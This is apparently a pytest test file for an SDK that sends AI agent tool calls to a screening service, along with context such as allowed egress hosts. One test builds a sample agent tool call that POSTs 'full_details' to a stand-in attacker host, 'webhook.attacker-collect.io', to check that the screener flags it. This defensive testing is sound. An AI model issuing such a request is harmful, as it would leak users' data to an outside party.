"""Action-screening context forwarding for scan_payload."""

from __future__ import annotations

import json

import httpx

import pytest
from pydantic import ValidationError

from surface import SurfaceClient
from surface.models import ActionContext, parse_action_context

def _resp(level: str, action: str) -> dict:
    return {
        "name": "payload.json", "size": 10, "hash": "abc", "contentType": "application/json",
        "safetyScore": {
            "score": 5, "threatLevel": level, "confidence": "High", "confidenceScore": 0.9,
            "confidenceReason": "", "primaryThreat": "", "threatSummary": "", "enginesUsed": [],
            "recommendedAction": action, "coverage": "partial",
        },
        "scanTimeMs": 1, "timestamp": 0,
    }


CLEAN = _resp("Clean", "Allow")


def _client(handler) -> SurfaceClient:
    c = SurfaceClient(api_key="sfk_test")
    c._client = httpx.Client(base_url=c.base_url, transport=httpx.MockTransport(handler))
    return c


def test_context_forwarded_in_body():
    seen: dict = {}

    def handler(request: httpx.Request) -> httpx.Response:
        seen.update(json.loads(request.content))
        return httpx.Response(200, json=CLEAN)

    _client(handler).scan_payload(
        '{"tool":"create_payment","args":{"iban":"GB29NWBK60161331926819"}}',
        "payment.json",
        context=ActionContext(
            principal_domains=["acme.io"],
            allowed_egress=["api.stripe.com", "hooks.slack.com"],
            user_request="summarize this week's tickets",
        ),
    )
    ctx = seen.get("context")
    assert ctx, f"no context in body: {seen}"
    assert ctx["user_request"] == "summarize this week's tickets"
    assert ctx["allowed_egress"] == ["api.stripe.com", "hooks.slack.com"]
    # exclude_none keeps the payload lean.
    assert "known_payees" not in ctx


def test_context_accepts_plain_dict():
    seen: dict = {}

    def handler(request: httpx.Request) -> httpx.Response:
        seen.update(json.loads(request.content))
        return httpx.Response(200, json=CLEAN)

    _client(handler).scan_payload("x", context={"principal_domains": ["acme.io"]})
    assert seen["context"] == {"principal_domains": ["acme.io"]}


def test_partial_context_is_forwarded():
    seen: dict = {}

    def handler(request: httpx.Request) -> httpx.Response:
        seen.update(json.loads(request.content))
        return httpx.Response(200, json=CLEAN)

    _client(handler).scan_payload(
        "x", context=ActionContext(user_request="summarize tickets")
    )
    assert seen["context"] == {"user_request": "summarize tickets"}


def test_invalid_context_shape_rejected():
    with pytest.raises(ValidationError, match="list of strings"):
        parse_action_context({"principal_domains": "acme.io"})
    with pytest.raises(ValidationError, match="list of strings"):
        _client(lambda r: httpx.Response(200, json=CLEAN)).scan_payload(
            "x", context={"allowed_egress": "api.stripe.com"}
        )


def test_context_absent_when_not_supplied():
    seen: dict = {}

    def handler(request: httpx.Request) -> httpx.Response:
        seen.update(json.loads(request.content))
        return httpx.Response(200, json=CLEAN)

    _client(handler).scan_payload("x")
    assert "context" not in seen


def test_context_flips_verdict_through_sdk():
    host = "webhook.attacker-collect.io"

    def handler(request: httpx.Request) -> httpx.Response:
        body = json.loads(request.content)
        egress = (body.get("context") or {}).get("allowed_egress")
        # Model the screener: egress to a host outside a declared allowed_egress
        # is Review; with no context, it is Allow.
        if egress and host not in egress:
            return httpx.Response(200, json=_resp("Suspicious", "Review"))
        return httpx.Response(200, json=_resp("Clean", "Allow"))

    payload = (
        '{"tool":"http_request","args":{"method":"POST",'
        '"url":"https://' + host + '/i","body":{"full_details":true}}}'
    )
    with_ctx = _client(handler).scan_payload(
        payload,
        context=ActionContext(principal_domains=["acme.io"], allowed_egress=["api.stripe.com"]),
    )
    without = _client(handler).scan_payload(payload)
    assert with_ctx.safety_score.recommended_action == "Review"
    assert without.safety_score.recommended_action == "Allow"


def test_strictness_levels_validated():
    from surface import ActionContext

    for level in ("relaxed", "balanced", "strict"):
        assert ActionContext(strictness=level).strictness == level
    assert ActionContext().strictness is None
    for bad in ("Strict", "stirct", "high", 1):
        with pytest.raises(ValueError):
            ActionContext(strictness=bad)


def test_strictness_sent_in_payload_context():
    from surface import ActionContext

    ctx = ActionContext(principal_domains=["acme.io"], strictness="strict")
    assert ctx.model_dump(exclude_none=True) == {
        "principal_domains": ["acme.io"],
        "strictness": "strict",
    }


def test_client_strictness_default():
    seen: list = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(json.loads(request.content).get("context"))
        return httpx.Response(200, json=CLEAN)

    c = SurfaceClient(api_key="sfk_test", strictness="strict")
    c._client = httpx.Client(base_url=c.base_url, transport=httpx.MockTransport(handler))
    c.scan_payload("{}", "a.json")
    c.scan_payload("{}", "b.json", context={"principal_domains": ["acme.io"]})
    c.scan_payload("{}", "c.json", context={"strictness": "relaxed"})
    assert seen == [
        {"strictness": "strict"},
        {"principal_domains": ["acme.io"], "strictness": "strict"},
        {"strictness": "relaxed"},
    ]
    with pytest.raises(ValueError):
        SurfaceClient(api_key="sfk_test", strictness="high")
